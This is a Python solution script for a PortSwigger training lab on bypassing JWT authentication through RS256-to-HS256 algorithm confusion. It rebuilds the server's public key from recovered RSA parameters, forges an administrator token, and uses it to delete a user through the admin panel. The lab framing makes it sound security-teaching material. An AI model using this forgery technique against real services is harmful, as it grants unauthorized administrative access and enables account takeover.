"""
Lab 8: JWT authentication bypass via algorithm confusion with no exposed key
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key
Difficulty: Expert

📝 The flaw: same RS256->HS256 confusion as Lab 7, but there's no /jwks.json
to hand us the public key. We have to RECONSTRUCT it ourselves from two (or
more) valid RS256 tokens signed by the server with the same private key —
this is possible because RSA public keys can be derived from several
signature/message pairs via an algorithm (see the `rsa_sign2n` project).

This script assumes you've already run that recovery step externally and
just focuses on using the recovered modulus/exponent to forge a token —
matching the "one tool does the math, we do the exploit" split most
writeups use in practice.

Requires: pip install pyjwt cryptography --break-system-packages
External tool: https://github.com/silentsignal/rsa_sign2n (run jwt_forgery.py
against two captured tokens to recover candidate (n, e) pairs first).
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers

from utils import get_session, log, note, decode_jwt, forge_hs256_token

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}

# Fill these in from rsa_sign2n's jwt_forgery.py output (it prints several
# candidate (n, e) pairs — the lab's own "Go to exploit server" tip isn't
# needed here, but you DO need two valid tokens captured via Burp first).
RECOVERED_N = 0  # REPLACE
RECOVERED_E = 65537


def build_public_pem(n, e):
    pub = RSAPublicNumbers(e, n).public_key()
    return pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def run():
    if RECOVERED_N == 0:
        note("Set RECOVERED_N/RECOVERED_E from rsa_sign2n's jwt_forgery.py first —")
        note("capture 2+ valid tokens in Burp, feed them to that tool, then rerun.")
        return

    s = get_session()
    r = s.post(f"{TARGET}/login", data=WIENER)
    token = s.cookies.get("session")
    header, payload = decode_jwt(token)

    pem = build_public_pem(RECOVERED_N, RECOVERED_E)
    note("Reconstructed public key PEM — using it as the HS256 secret, same")
    note("trick as Lab 7, just without the server handing us the key directly.")

    header["alg"] = "HS256"
    payload["sub"] = "administrator"

    forged = forge_hs256_token(header, payload, key=pem)
    s.cookies.set("session", forged)

    r = s.get(f"{TARGET}/admin")
    log(f"/admin status: {r.status_code}")
    if r.status_code == 200:
        r = s.post(f"{TARGET}/admin/delete", params={"username": "carlos"})
        log(f"Delete carlos responded {r.status_code}")
    else:
        note("Wrong candidate key? rsa_sign2n usually returns several (n,e)")
        note("pairs — try each one if the first doesn't verify.")


if __name__ == "__main__":
    run()
